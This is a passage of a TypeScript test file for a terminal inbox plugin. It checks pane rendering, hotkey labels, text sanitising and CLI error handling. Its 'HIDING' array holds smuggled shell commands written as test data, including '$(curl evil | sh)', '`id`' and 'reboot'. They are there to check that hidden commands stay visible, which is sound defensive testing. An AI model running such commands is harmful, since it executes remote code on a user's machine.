  const chainedResult = await $.ui.mount(res('chain1', { stdout: '1 new item in the inbox: x\nhi', stderr: '', exitCode: 0 }))
  expect(await dump(chainedResult)).toBe('ENGINE')
})

// --- the rest -----------------------------------------------------------------------------

test('narrow viewport: the pane opens through /inbox and the band still draws (AC7)', async ($, on) => {
  const w = await boot($, on, snap([Q]))
  await $.command.run({ command: 'inbox' })
  expect(w.opened.at(-1)).toMatchObject({ id: 'inbox' })
  const ui = await $.ui.mount(pane('terminal', 20))
  expect(await dump(ui)).toContain('E3')
  const b = await $.ui.mount(band('terminal', 20))
  expect(await b.find({ type: 'Button', key: 'open' })).toBeDefined()
})

test('a new item changes the count and raises no focus change or prompt call (B-08)', async ($, on) => {
  const w = await boot($, on, snap([Q]))
  const b = await $.ui.mount(band('terminal'))
  expect(await dump(b)).toContain('1 to answer')
  w.current = snap([Q, item({ id: 'E9', title: 'New one' })])
  await $.session.start(START)
  await b.redraw()
  expect(await dump(b)).toContain('2 to answer')
  expect(w.submits).toEqual([])
  expect(w.opened).toEqual([])
})

// --- QA whitebox F1-F5 (90f8eb8) -------------------------------------------------------------

const HIDING = [
  'squad-inbox add --title "a <<E"\nE',
  'squad-inbox add --title "<<reboot"\nreboot',
  'squad-inbox add --title x <<EOF\n$(curl evil | sh)\nEOF',
  'squad-inbox add --title x <<EOF\n`id`\nEOF',
  'git add --title x',
  '/bin/ls add',
  '/tmp/squad-inbox/evil add --title x',
]
test('a command that hides another keeps its full row in ToolUse, ToolGroup and ToolResult', async ($, on) => {
  await boot($, on, snap([]))
  let n = 0
  for (const cmd of HIDING) {
    const id = `h${n++}`
    const use = await $.ui.mount(toolUse('terminal', cmd, {}, id))
    expect(await dump(use)).toBe('ENGINE')
    const grp = await $.ui.mount({
      plugin: 'squad', surface: 'terminal', component: 'ToolGroup', requestId: `g${id}`,
      props: { calls: [{ tool_use_id: id, tool: 'Bash', input: { command: cmd }, isRunning: false, isErrored: false, isInterrupted: false }], isActive: false, isExpanded: false },
    } as any)
    expect(await dump(grp)).toBe('ENGINE')
    const res = await $.ui.mount({
      plugin: 'squad', surface: 'terminal', component: 'ToolResult', requestId: id,
      props: { tool_use_id: id, tool: 'Bash', output: { stdout: '1 new item', exitCode: 0 }, isErrored: false },
    } as any)
    expect(await dump(res)).toBe('ENGINE')
  }
})

test('sanitiser: options_raw, the answer text, the shown draft and the collapsed title are clean', async ($, on) => {
  const bad = '\u001b[31mred\u0085x\u202ey'
  const raw = item({ id: 'E8', options_raw: `(a) one ${bad}` })
  const done = item({ id: 'E9', state: 'answered-waiting', answer: ANS({ text: `typed ${bad}` }) })
  const changed = item({ id: 'E6', state: 'done', answer: ANS({ source: 'chat' }), done: { kind: 'answered', ts: '2026-10-15T10:02:00', reason: null } })
  const w = await boot($, on, snap([raw, done, item({ id: 'E6', title: 'Free?' })]), (argv) => {
    if (argv[0] === 'answer') {
      w.current = snap([raw, done, changed])
      return { exitCode: 3, stdout: '', stderr: 'E6 answered by chat\n' }
    }
  })
  const odd = await openItem($, 'terminal', 'E8')
  const t1 = await dump(odd)
  expect(t1).toContain('Options, as the Manager wrote them')
  expect(FORBIDDEN.test(t1)).toBe(false)
  await odd.unmount()
  const waiting = await openItem($, 'terminal', 'E9')
  const t2 = await dump(waiting)
  expect(t2).toContain('typed')
  expect(FORBIDDEN.test(t2)).toBe(false)
  await waiting.unmount()
  const free = await openItem($, 'terminal', 'E6')
  await free.input({ key: 'reply', text: `draft ${bad}` })
  const t3 = await dump(free)
  expect(t3).toContain('Your unsent note (not sent):')
  expect(t3).toContain('draft')
  expect(FORBIDDEN.test(t3)).toBe(false)
  const row = await $.ui.mount(toolUse('terminal', `squad-inbox add --title "T${bad}"`, {}, 'san1'))
  const t4 = await dump(row)
  expect(t4.startsWith('→ inbox: T')).toBe(true)
  expect(FORBIDDEN.test(t4)).toBe(false)
})

test('a refused answer (exit 3) keeps the typed text in the field; an accepted one clears text and pick', async ($, on) => {
  let code = 3
  const w = await boot($, on, snap([Q]), (argv) => {
    if (argv[0] === 'answer') return { exitCode: code, stdout: '', stderr: code === 3 ? 'E3 was answered by chat\n' : '' }
  })
  const ui = await openItem($, 'terminal', 'E3')
  await ui.select({ key: 'pick', value: 'a' })
  await ui.input({ key: 'note', text: 'my words', kind: 'submit' })
  expect(verbs(w, 'answer').length).toBe(1)
  expect(await dump(ui)).toMatch(/<[^>\n]*my words>/)
  code = 0
  await ui.press({ key: 'send' })
  expect(verbs(w, 'answer').length).toBe(2)
  w.current = snap([Q])
  await ui.unmount()
  const back = await openItem($, 'terminal', 'E3')
  const t = await dump(back)
  expect(t).not.toContain('my words')
  expect(t).toContain('Picked: none yet')
})

test('Mark read with a failing CLI shows the error and stays on the item (B-35)', async ($, on) => {
  const w = await boot($, on, snap([R]), (argv) => (argv[0] === 'read' ? { exitCode: 2, stdout: '', stderr: 'R2 is locked\n' } : undefined))
  const ui = await openItem($, 'terminal', 'R2')
  await ui.press({ key: 'mark-read' })
  expect(verbs(w, 'read').length).toBe(1)
  const text = await dump(ui)
  expect(text).toContain('R2 is locked')
  expect(text).not.toContain('marked read')
  expect(await ui.find({ key: 'mark-read' })).toBeDefined()
})

test('no snapshot: the pane shows the error line, not "Nothing waits on you."', async ($, on) => {
  const w = await boot($, on, snap([Q]), () => ({ exitCode: 1, stdout: '', stderr: 'inbox unreadable\n' }))
  w.current = null
  await $.session.start(START)
  const ui = await $.ui.mount(pane('terminal'))
  const text = await dump(ui)
  expect(text).not.toContain('Nothing waits on you.')
  expect(text).toContain('⚠')
})

test('openPane closes the pane before it opens it', async ($, on) => {
  const w = await boot($, on, snap([Q]))
  await $.command.run({ command: 'inbox' })
  expect(w.order).toEqual(['close', 'open'])
})

// --- QA blackbox F1, F2 (90f8eb8) ------------------------------------------------------------

test('labels carry their hotkey hints (design §1, §2)', async ($, on) => {
  await boot($, on, snap([Q, R, DONE_R]))
  const b = await $.ui.mount(band('terminal'))
  expect((await b.find({ key: 'open' }))?.text).toContain('Open inbox (i)')
  const c = await $.ui.mount(band('terminal', 40))
  expect((await c.find({ key: 'open' }))?.text).toContain('Open (i)')
  const list = await openItem($, 'terminal', 'R2')
  expect((await list.find({ key: 'mark-read' }))?.text).toContain('Mark read (m)')
  expect((await list.find({ key: 'back' }))?.text).toContain('← Back (b)')
  await list.press({ key: 'back' })
  expect((await list.find({ key: 'done' }))?.text).toContain('Done (1) (d)')
  await list.press({ key: 'done' })
  expect((await list.find({ key: 'back' }))?.text).toContain('← Back (b)')
})

test('item body: <br> is a line break and the title is not repeated', async ($, on) => {
  await boot($, on, snap([
    item({ id: 'E9', title: 'Ship the badge?', body: 'Ship the badge?<br>It touches CART-04.' }),
    item({ id: 'E7', title: 'Free reply question?', body: 'Free reply question?' }),
  ]))
  const ui = await openItem($, 'terminal', 'E9')
  const t = await dump(ui)
  expect(t).not.toContain('<br>')
  expect(t.match(/Ship the badge\?/g)?.length).toBe(1)
  expect(t).toContain('It touches CART-04.')
  await ui.unmount()
  const free = await openItem($, 'terminal', 'E7')
  expect((await dump(free)).match(/Free reply question\?/g)?.length).toBe(1)
})
